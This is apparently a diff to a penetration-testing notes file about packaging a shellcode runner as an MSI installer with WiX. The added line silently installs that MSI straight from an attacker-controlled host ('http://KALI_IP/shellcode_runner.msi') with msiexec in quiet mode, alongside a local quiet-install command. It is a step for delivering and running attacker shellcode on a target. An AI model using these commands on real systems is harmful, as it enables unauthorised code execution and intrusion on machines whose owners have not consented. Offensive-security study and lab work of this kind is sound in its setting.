@@ -304,6 +304,7 @@ wine light.exe -out shellcode_runner.msi shellcode_runner.wixobj -sval
 
 ```
 msiexec /q /i shellcode_runner.msi
+msiexec /q /i http://KALI_IP/shellcode_runner.msi
 ```
 ![image](https://user-images.githubusercontent.com/9944198/158667046-e0f6264e-0cb5-46b9-99e7-0b9775c4bc8f.png)
 
